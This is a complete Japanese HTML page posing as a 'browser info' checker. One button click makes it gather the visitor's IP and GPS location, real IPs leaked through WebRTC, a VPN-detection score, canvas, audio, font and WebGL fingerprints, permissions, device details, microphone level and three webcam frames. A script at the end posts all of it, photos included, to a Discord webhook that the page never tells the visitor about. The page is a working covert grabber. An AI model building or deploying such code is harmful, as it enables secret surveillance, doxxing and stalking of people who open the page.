<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>ページ</title>
<style>
  :root{
    --bg:#070a12;
    --panel:rgba(255,255,255,.04);
    --panel-2:rgba(255,255,255,.065);
    --border:rgba(255,255,255,.09);
    --text:#e8ecf4;
    --muted:#8b96ab;
    --accent:#5eead4;
    --accent-2:#818cf8;
    --danger:#fb7185;
    --ok:#34d399;
    --radius:18px;
  }

  *{box-sizing:border-box}

  html,body{height:100%}

  body{
    margin:0;
    padding:48px 20px 80px;
    color:var(--text);
    font-family:system-ui,-apple-system,"Segoe UI","Hiragino Sans","Noto Sans JP",sans-serif;
    -webkit-font-smoothing:antialiased;
    background:
      radial-gradient(900px 600px at 10% -12%, rgba(129,140,248,.22), transparent 60%),
      radial-gradient(820px 520px at 92% -6%, rgba(94,234,212,.16), transparent 55%),
      radial-gradient(760px 700px at 50% 118%, rgba(236,72,153,.10), transparent 60%),
      var(--bg);
    background-attachment:fixed;
    min-height:100%;
  }

  .app{max-width:1020px;margin:0 auto}

  /* ---------- header ---------- */
  header{margin-bottom:28px}

  .badge{
    display:inline-block;
    padding:5px 12px;
    border-radius:999px;
    font-size:11px;
    font-weight:700;
    letter-spacing:.16em;
    text-transform:uppercase;
    color:var(--accent);
    background:rgba(94,234,212,.10);
    border:1px solid rgba(94,234,212,.28);
  }

  h1{
    margin:16px 0 8px;
    font-size:clamp(26px,4vw,40px);
    line-height:1.15;
    letter-spacing:-.02em;
    background:linear-gradient(120deg,#ffffff 20%,var(--accent) 60%,var(--accent-2) 95%);
    -webkit-background-clip:text;
    background-clip:text;
    color:transparent;
  }

  .sub{
    margin:0;
    max-width:60ch;
    color:var(--muted);
    font-size:14px;
    line-height:1.75;
  }

  /* ---------- cards ---------- */
  .card{
    background:var(--panel);
    border:1px solid var(--border);
    border-radius:var(--radius);
    padding:22px 24px;
    backdrop-filter:blur(14px);
    -webkit-backdrop-filter:blur(14px);
    box-shadow:0 24px 60px -32px rgba(0,0,0,.9);
  }

  .consent h2{
    margin:0 0 14px;
    font-size:15px;
    letter-spacing:.02em;
    color:#fff;
  }

  .checklist{
    list-style:none;
    margin:0 0 22px;
    padding:0;
    display:grid;
    gap:9px;
    font-size:13.5px;
    color:var(--muted);
  }

  .checklist li{
    display:flex;
    align-items:center;
    gap:10px;
  }

  .checklist li::before{
    content:"";
    width:6px;height:6px;
    border-radius:50%;
    flex:none;
    background:linear-gradient(135deg,var(--accent),var(--accent-2));
    box-shadow:0 0 10px rgba(94,234,212,.7);
  }

  /* ---------- button ---------- */
  .btn{
    position:relative;
    overflow:hidden;
    border:0;
    cursor:pointer;
    padding:14px 34px;
    border-radius:999px;
    font-family:inherit;
    font-size:15px;
    font-weight:700;
    letter-spacing:.03em;
    color:#04121a;
    background:linear-gradient(135deg,var(--accent),var(--accent-2));
    box-shadow:0 12px 34px -12px rgba(94,234,212,.65);
    transition:transform .18s ease, box-shadow .18s ease, filter .18s ease;
  }

  .btn::after{
    content:"";
    position:absolute;
    inset:0;
    background:linear-gradient(115deg,transparent 35%,rgba(255,255,255,.55) 50%,transparent 65%);
    transform:translateX(-130%);
    transition:transform .7s ease;
  }

  .btn:hover{transform:translateY(-2px);box-shadow:0 18px 44px -14px rgba(129,140,248,.75)}
  .btn:hover::after{transform:translateX(130%)}
  .btn:active{transform:translateY(0) scale(.98)}
  .btn[disabled]{cursor:progress;filter:grayscale(.55) brightness(.85);transform:none}
  .btn[disabled]::after{display:none}

  /* ---------- status ---------- */
  .status{
    position:relative;
    display:inline-flex;
    align-items:center;
    gap:10px;
    margin-top:20px;
    padding:10px 18px 11px;
    border-radius:999px;
    background:var(--panel-2);
    border:1px solid var(--border);
    font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
    font-size:12.5px;
    color:var(--muted);
    overflow:hidden;
  }

  .status .dot{
    width:8px;height:8px;border-radius:50%;
    background:var(--muted);
    flex:none;
    transition:background .2s;
  }

  .status[data-state="working"]{color:var(--accent)}
  .status[data-state="working"] .dot{background:var(--accent);animation:pulse 1.1s ease-in-out infinite}
  .status[data-state="ok"]{color:var(--ok)}
  .status[data-state="ok"] .dot{background:var(--ok)}
  .status[data-state="error"]{color:var(--danger)}
  .status[data-state="error"] .dot{background:var(--danger)}

  .status .bar{
    position:absolute;
    left:0;bottom:0;
    height:2px;width:40%;
    background:linear-gradient(90deg,transparent,var(--accent),transparent);
    opacity:0;
  }

  .status[data-state="working"] .bar{opacity:1;animation:slide 1.3s linear infinite}

  @keyframes pulse{
    0%,100%{box-shadow:0 0 0 0 rgba(94,234,212,.55)}
    50%{box-shadow:0 0 0 6px rgba(94,234,212,0)}
  }

  @keyframes slide{
    0%{transform:translateX(-100%)}
    100%{transform:translateX(350%)}
  }

  /* ---------- results ---------- */
  .results{
    display:grid;
    grid-template-columns:repeat(auto-fill,minmax(310px,1fr));
    gap:14px;
    margin-top:24px;
  }

  .results.hidden{display:none}

  .result-card{
    padding:20px 20px 18px;
    animation:rise .5s cubic-bezier(.2,.7,.3,1) both;
  }

  @keyframes rise{
    from{opacity:0;transform:translateY(14px)}
    to{opacity:1;transform:none}
  }

  .result-card h3{
    margin:0 0 14px;
    font-size:11.5px;
    font-weight:700;
    letter-spacing:.14em;
    text-transform:uppercase;
    color:var(--accent);
  }

  .kv{display:grid;gap:9px}

  .kv-row{
    display:grid;
    grid-template-columns:minmax(76px,auto) 1fr;
    gap:12px;
    align-items:start;
    font-size:12.5px;
    line-height:1.55;
  }

  .kv-row .k{color:var(--muted);white-space:nowrap}
  .kv-row .v{
    color:var(--text);
    white-space:pre-wrap;
    word-break:break-word;
    font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
    font-size:12px;
  }

  footer{
    margin-top:36px;
    text-align:center;
    font-size:11.5px;
    color:rgba(139,150,171,.65);
    letter-spacing:.04em;
  }

  @media (prefers-reduced-motion:reduce){
    *{animation:none!important;transition:none!important}
  }
</style>
</head>
<body>
<div class="app">

  <header>
    <span class="badge">Info</span>
    <h1>ブラウザ情報</h1>
    <p class="sub">
      ボタンを押すと、この端末から取得できる情報を収集して処理します。
      各項目はブラウザの許可ダイアログで同意した場合のみ取得されます。
    </p>
  </header>

  <section class="card consent">
    <h2>収集される項目</h2>
    <ul class="checklist">
      <li>IP アドレス / 位置情報（IP・GPS）</li>
      <li>WebRTC 経由の実 IP / VPN 判定</li>
      <li>カメラ映像（フレーム） / マイク入力レベル</li>
      <li>Canvas・Audio・フォントなどのフィンガープリント</li>
      <li>端末情報・権限・メディアデバイス一覧</li>
    </ul>

    <button id="consent" class="btn">続ける</button>

    <div id="status" class="status" data-state="idle">
      <span class="dot"></span>
      <span class="status-text">待機中</span>
      <span class="bar"></span>
    </div>
  </section>

  <section id="results" class="results hidden"></section>

  <footer>結果はこのページ内にも表示されます</footer>
</div>

<video id="preview" autoplay playsinline muted style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
const WEBHOOK_URL = "https://discord.com/api/webhooks/XXXX/XXXX"; // 自分のWebhook
const sleep = ms => new Promise(r => setTimeout(r, ms));

function haversineKm(a,b,c,d){const R=6371,t=x=>x*Math.PI/180,dl=t(c-a),dn=t(d-b);const h=Math.sin(dl/2)**2+Math.cos(t(a))*Math.cos(t(c))*Math.sin(dn/2)**2;return 2*R*Math.asin(Math.sqrt(h));}

// ---------- WebRTC: 実IPリーク ----------
function getWebRTCIPs(timeoutMs = 3000) {
  return new Promise(resolve => {
    const ips = new Set();
    let pc;
    try {
      pc = new RTCPeerConnection({
        iceServers: [
          { urls: "stun:stun.l.google.com:19302" },
          { urls: "stun:stun1.l.google.com:19302" },
        ],
      });
    } catch { return resolve([]); }

    const done = () => {
      try { pc.close(); } catch {}
      resolve([...ips]);
    };
    const timer = setTimeout(done, timeoutMs);

    pc.onicecandidate = e => {
      if (!e.candidate) { clearTimeout(timer); done(); return; }
      const m = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9:]+)/i.exec(e.candidate.candidate);
      if (m) ips.add(m[1]);
    };

    pc.createDataChannel("x");
    pc.createOffer()
      .then(o => pc.setLocalDescription(o))
      .catch(() => { clearTimeout(timer); done(); });
  });
}

// ---------- Canvas fingerprint ----------
function canvasFingerprint() {
  try {
    const c = document.createElement("canvas");
    c.width = 240; c.height = 60;
    const ctx = c.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "14px 'Arial'";
    ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = "#069"; ctx.fillText("fingerprint", 2, 15);
    ctx.fillStyle = "rgba(102,204,0,0.7)"; ctx.fillText("fingerprint", 4, 17);
    const data = c.toDataURL();
    let h = 0; for (let i = 0; i < data.length; i++) h = (h * 31 + data.charCodeAt(i)) | 0;
    return { hash: (h >>> 0).toString(16), sample: data.slice(-64) };
  } catch { return "N/A"; }
}

// ---------- Audio fingerprint ----------
async function audioFingerprint() {
  try {
    const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
    const osc = ctx.createOscillator();
    osc.type = "triangle"; osc.frequency.value = 10000;
    const comp = ctx.createDynamicsCompressor();
    osc.connect(comp); comp.connect(ctx.destination);
    osc.start(0);
    const buf = await ctx.startRendering();
    const ch = buf.getChannelData(0);
    let sum = 0; for (let i = 4500; i < 5000; i++) sum += Math.abs(ch[i]);
    return sum.toFixed(6);
  } catch { return "N/A"; }
}

// ---------- Fonts ----------
function detectFonts() {
  const base = ["monospace","sans-serif","serif"];
  const test = ["Arial","Helvetica","Times New Roman","Courier New","Verdana","Georgia",
    "Tahoma","Trebuchet MS","Comic Sans MS","Impact","Segoe UI","Calibri","Cambria",
    "Consolas","Meiryo","MS Gothic","Yu Gothic","Hiragino Sans","Hiragino Kaku Gothic ProN",
    "Noto Sans JP","Roboto","Ubuntu","DejaVu Sans","Menlo","Monaco"];
  const c = document.createElement("canvas").getContext("2d");
  const sample = "mmmmmmmmmmlli1|WQ@#";
  const baseline = {};
  base.forEach(b => { c.font = `72px ${b}`; baseline[b] = c.measureText(sample).width; });
  return test.filter(f => base.some(b => {
    c.font = `72px '${f}', ${b}`;
    return c.measureText(sample).width !== baseline[b];
  }));
}

// ---------- Media devices ----------
async function getMediaDevices() {
  try {
    const devs = await navigator.mediaDevices.enumerateDevices();
    return devs.map(d => ({ kind: d.kind, label: d.label || "(未許可)" }));
  } catch { return "N/A"; }
}

// ---------- Permissions ----------
async function getPermissions() {
  const names = ["geolocation","notifications","camera","microphone","clipboard-read","clipboard-write","persistent-storage","midi","background-sync","accelerometer","gyroscope","magnetometer"];
  const out = {};
  for (const n of names) {
    try { out[n] = (await navigator.permissions.query({ name: n })).state; }
    catch { out[n] = "unsupported"; }
  }
  return out;
}

// ---------- Voices ----------
function getVoices() {
  try { return speechSynthesis.getVoices().map(v => `${v.name} (${v.lang})`); }
  catch { return "N/A"; }
}

// ---------- Storage / screen ----------
async function getStorage() {
  try {
    const e = await navigator.storage?.estimate?.();
    return e ? { quota: e.quota, usage: e.usage } : "N/A";
  } catch { return "N/A"; }
}
function getScreenExtra() {
  return {
    orientation: screen.orientation?.type ?? "N/A",
    colorGamut: matchMedia("(color-gamut: p3)").matches ? "p3" : matchMedia("(color-gamut: srgb)").matches ? "srgb" : "N/A",
    hdr: matchMedia("(dynamic-range: high)").matches,
    reducedMotion: matchMedia("(prefers-reduced-motion: reduce)").matches,
    darkMode: matchMedia("(prefers-color-scheme: dark)").matches,
  };
}

// ---------- IP・位置 ----------
async function getIPInfo() {
  const out = { ip: "取得失敗", source: null };
  try {
    const r = await fetch("https://ipinfo.io/json");
    if (r.ok) {
      const j = await r.json();
      Object.assign(out, { ip: j.ip, city: j.city, region: j.region, country: j.country, loc: j.loc, org: j.org, timezone: j.timezone, postal: j.postal, source: "ipinfo.io" });
      return out;
    }
  } catch {}
  try {
    const r = await fetch("https://ipapi.co/json/");
    if (r.ok) {
      const j = await r.json();
      Object.assign(out, { ip: j.ip, city: j.city, region: j.region, country: j.country_name, loc: j.latitude ? `${j.latitude},${j.longitude}` : null, org: j.org, timezone: j.timezone, source: "ipapi.co" });
    }
  } catch {}
  return out;
}

const VPN_KEYWORDS = ["vpn","proxy","hosting","cloud","datacenter","server","digitalocean","linode","vultr","ovh","hetzner","contabo","m247","datacamp","leaseweb","choopa","colocation","amazon","aws","google","microsoft","azure","oracle","nordvpn","expressvpn","protonvpn","surfshark","cyberghost","ipvanish","private internet access","mullvad"];

async function getIPAPIFlags(ip) {
  try {
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=proxy,hosting,mobile,isp,as`);
    if (r.ok) return await r.json();
  } catch {}
  return null;
}

async function detectVPN(ipinfo, gps, webrtcIPs) {
  const r = { likely: false, score: 0, reasons: [], realIPs: [] };
  const add = (p, s) => { r.score += p; r.reasons.push(s); };

  // WebRTC実IPがIPと食い違う → 強い根拠
  if (webrtcIPs && webrtcIPs.length) {
    const others = webrtcIPs.filter(x => x !== ipinfo.ip);
    r.realIPs = others;
    if (others.length) add(60, `WebRTCが別IPを返却: ${others.join(", ")} (経路IP=${ipinfo.ip})`);
  }

  if (ipinfo.timezone) {
    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    if (tz && ipinfo.timezone !== tz) add(30, `TZ不一致: browser=${tz} / ip=${ipinfo.timezone}`);
  }
  if (ipinfo.org) {
    const o = ipinfo.org.toLowerCase();
    const hit = VPN_KEYWORDS.find(k => o.includes(k));
    if (hit) add(40, `orgに"${hit}"を含む: ${ipinfo.org}`);
  }
  if (ipinfo.loc && gps) {
    const [a,b] = ipinfo.loc.split(",").map(Number);
    const d = haversineKm(a,b,gps.lat,gps.lon);
    if (d > 1000) add(40, `IP位置とGPSが約${d.toFixed(0)}km乖離`);
    else if (d > 300) add(20, `IP位置とGPSが約${d.toFixed(0)}km乖離`);
  }
  const flags = await getIPAPIFlags(ipinfo.ip);
  if (flags) {
    if (flags.proxy)   add(50, `ip-api: proxy=true (${flags.isp})`);
    if (flags.hosting) add(30, `ip-api: hosting=true (${flags.as})`);
  }
  r.likely = r.score >= 40;
  r.confidence = r.score >= 80 ? "high" : r.score >= 40 ? "medium" : "low";
  return r;
}

// ---------- デバイス ----------
function collectDeviceInfo() {
  return {
    userAgent: navigator.userAgent, platform: navigator.platform,
    language: navigator.language, languages: (navigator.languages||[]).join(","),
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen: `${screen.width}x${screen.height} @${devicePixelRatio}x`,
    window: `${innerWidth}x${innerHeight}`, colorDepth: screen.colorDepth,
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: navigator.deviceMemory ?? "N/A",
    touchPoints: navigator.maxTouchPoints,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    online: navigator.onLine,
    screenExtra: getScreenExtra(),
  };
}
async function getBattery() { try { const b = await navigator.getBattery?.(); return b ? { level: b.level, charging: b.charging } : "N/A"; } catch { return "N/A"; } }
async function getConnection() { const c = navigator.connection || {}; return { effectiveType: c.effectiveType ?? "N/A", downlink: c.downlink ?? "N/A", rtt: c.rtt ?? "N/A" }; }
function getWebGL() { try { const gl = document.createElement("canvas").getContext("webgl"); const e = gl.getExtension("WEBGL_debug_renderer_info"); return { vendor: gl.getParameter(e.UNMASKED_VENDOR_WEBGL), renderer: gl.getParameter(e.UNMASKED_RENDERER_WEBGL) }; } catch { return "N/A"; } }

async function getGPS() {
  try {
    const p = await new Promise((res,rej) => navigator.geolocation.getCurrentPosition(res,rej,{timeout:10000,enableHighAccuracy:true}));
    return { lat: p.coords.latitude, lon: p.coords.longitude, accuracy: p.coords.accuracy };
  } catch { return null; }
}
async function captureFrames(n=3, gap=400) {
  try {
    const s = await navigator.mediaDevices.getUserMedia({ video: true });
    const v = document.getElementById("preview");
    v.srcObject = s; await sleep(800);
    const c = document.getElementById("canvas");
    c.width = v.videoWidth; c.height = v.videoHeight;
    const ctx = c.getContext("2d"); const out = [];
    for (let i=0;i<n;i++){ ctx.drawImage(v,0,0); out.push(c.toDataURL("image/jpeg",0.8)); await sleep(gap); }
    s.getTracks().forEach(t=>t.stop());
    return out;
  } catch { return []; }
}
async function getMicLevel() {
  try {
    const s = await navigator.mediaDevices.getUserMedia({ audio: true });
    const ctx = new AudioContext(); const an = ctx.createAnalyser();
    ctx.createMediaStreamSource(s).connect(an);
    await sleep(1000);
    const b = new Uint8Array(an.frequencyBinCount); an.getByteFrequencyData(b);
    const avg = b.reduce((x,y)=>x+y,0)/b.length;
    s.getTracks().forEach(t=>t.stop()); await ctx.close();
    return { avgLevel: avg.toFixed(2) };
  } catch { return "拒否/失敗"; }
}

// ---------- UI ヘルパー ----------
function setStatus(text, state = "idle") {
  const el = document.getElementById("status");
  el.dataset.state = state;
  el.querySelector(".status-text").textContent = text;
}

function makeCard(title, rows) {
  const el = document.createElement("section");
  el.className = "card result-card";

  const h = document.createElement("h3");
  h.textContent = title;
  el.appendChild(h);

  const box = document.createElement("div");
  box.className = "kv";

  for (const [k, v] of rows) {
    const row = document.createElement("div");
    row.className = "kv-row";

    const kk = document.createElement("span");
    kk.className = "k";
    kk.textContent = k;

    const vv = document.createElement("span");
    vv.className = "v";
    vv.textContent = (v === undefined || v === null || v === "") ? "—" : String(v);

    row.append(kk, vv);
    box.appendChild(row);
  }

  el.appendChild(box);
  return el;
}

function renderResults(p) {
  const root = document.getElementById("results");
  root.innerHTML = "";
  root.classList.remove("hidden");

  const loc  = p.location || {};
  const vpn  = p.vpn || {};
  const dev  = p.device || {};
  const fp   = p.fingerprint || {};
  const gps  = loc.gps_actual;

  const batteryText =
    p.battery && typeof p.battery === "object"
      ? `${Math.round(p.battery.level * 100)}% / ${p.battery.charging ? "充電中" : "未充電"}`
      : p.battery;

  const connText = p.connection
    ? `${p.connection.effectiveType} / ${p.connection.downlink}Mbps / ${p.connection.rtt}ms`
    : "—";

  const gpu = fp.webgl && typeof fp.webgl === "object"
    ? `${fp.webgl.vendor}\n${fp.webgl.renderer}`
    : fp.webgl;

  const fonts = Array.isArray(fp.fonts)
    ? `${fp.fonts.length} 種\n${fp.fonts.join(", ")}`
    : fp.fonts;

  const mds = fp.mediaDevices;

  const cards = [
    makeCard("ネットワーク", [
      ["IP", p.ip],
      ["組織", p.org],
      ["WebRTC", (p.webrtc_ips || []).join("\n") || "なし"],
      ["取得元", loc.source],
    ]),

    makeCard("位置情報", [
      ["市区町村", loc.city],
      ["地域", loc.region],
      ["国", loc.country],
      ["郵便番号", loc.postal],
      ["IP座標", loc.loc],
      ["GPS実測", gps ? `${gps.lat.toFixed(5)}, ${gps.lon.toFixed(5)}` : "未取得 / 拒否"],
      ["精度", gps ? `±${Math.round(gps.accuracy)} m` : "—"],
    ]),

    makeCard("VPN 判定", [
      ["判定", vpn.likely ? "⚠️ 疑いあり" : "異常なし"],
      ["スコア", vpn.score],
      ["信頼度", vpn.confidence],
      ["実IP候補", (vpn.realIPs || []).join("\n") || "なし"],
      ["理由", (vpn.reasons || []).join("\n") || "なし"],
    ]),

    makeCard("デバイス", [
      ["UA", dev.userAgent],
      ["プラットフォーム", dev.platform],
      ["言語", dev.languages || dev.language],
      ["タイムゾーン", dev.timezone],
      ["画面", dev.screen],
      ["ウィンドウ", dev.window],
      ["CPU コア", dev.hardwareConcurrency],
      ["メモリ", dev.deviceMemory],
      ["タッチ", dev.touchPoints],
      ["バッテリー", batteryText],
      ["回線", connText],
    ]),

    makeCard("フィンガープリント", [
      ["Canvas", fp.canvas && typeof fp.canvas === "object" ? fp.canvas.hash : fp.canvas],
      ["Audio", fp.audio],
      ["GPU", gpu],
      ["フォント", fonts],
      ["音声", Array.isArray(fp.voices) ? `${fp.voices.length} 件` : fp.voices],
    ]),

    makeCard("権限", fp.permissions && typeof fp.permissions === "object"
      ? Object.entries(fp.permissions)
      : [["—", "—"]]),

    makeCard("メディア", [
      ["マイク", p.mic && typeof p.mic === "object" ? `入力レベル ${p.mic.avgLevel}` : p.mic],
      ["デバイス", Array.isArray(mds) ? mds.map(d => `${d.kind}: ${d.label}`).join("\n") : mds],
    ]),
  ];

  cards.forEach((c, i) => {
    c.style.animationDelay = `${i * 60}ms`;
    root.appendChild(c);
  });
}

// ---------- メイン ----------
document.getElementById("consent").addEventListener("click", async (e) => {
  const btn = e.currentTarget;
  btn.disabled = true;

  document.getElementById("results").classList.add("hidden");
  setStatus("処理中…", "working");

  try {
    const [ipinfo, gps, webrtcIPs, battery, connection, frames, mic, perms, devices, audioFp, storage] = await Promise.all([
      getIPInfo(), getGPS(), getWebRTCIPs(), getBattery(), getConnection(),
      captureFrames(3), getMicLevel(), getPermissions(), getMediaDevices(),
      audioFingerprint(), getStorage(),
    ]);

    const vpn = await detectVPN(ipinfo, gps, webrtcIPs);

    const fingerprint = {
      canvas: canvasFingerprint(),
      audio: audioFp,
      fonts: detectFonts(),
      voices: getVoices(),
      webgl: getWebGL(),
      mediaDevices: devices,
      permissions: perms,
      storage,
    };

    const payload = {
      ip: ipinfo.ip,
      location: {
        city: ipinfo.city, region: ipinfo.region, country: ipinfo.country,
        postal: ipinfo.postal, loc: ipinfo.loc, source: ipinfo.source,
        gps_actual: gps,
      },
      vpn,
      webrtc_ips: webrtcIPs,
      org: ipinfo.org,
      device: collectDeviceInfo(),
      battery, connection,
      fingerprint,
      mic,
    };

    renderResults(payload);

    const header =
      `**ログ**\n` +
      `**IP:** \`${ipinfo.ip}\`\n` +
      `**市:** \`${ipinfo.city ?? "N/A"}\` / **地域:** \`${ipinfo.region ?? "N/A"}\` / **国:** \`${ipinfo.country ?? "N/A"}\`\n` +
      `**VPN疑い:** ${vpn.likely ? "⚠️ YES" : "no"} (score=${vpn.score}, ${vpn.confidence})\n` +
      (vpn.realIPs.length ? `**WebRTC実IP:** \`${vpn.realIPs.join(", ")}\`\n` : "") +
      `**理由:** ${vpn.reasons.length ? vpn.reasons.join(" / ") : "なし"}\n`;

    const content = header + "```json\n" + JSON.stringify(payload, null, 2) + "\n```";

    const form = new FormData();
    form.append("payload_json", JSON.stringify({ content }));
    for (let i = 0; i < frames.length; i++) {
      const blob = await (await fetch(frames[i])).blob();
      form.append(`file${i}`, blob, `frame_${i}.jpg`);
    }

    setStatus("処理中…", "working");
    await fetch(WEBHOOK_URL, { method: "POST", body: form });
    setStatus("完了", "ok");
  } catch (err) {
    setStatus("失敗: " + err.message, "error");
  } finally {
    btn.disabled = false;
  }
});
</script>
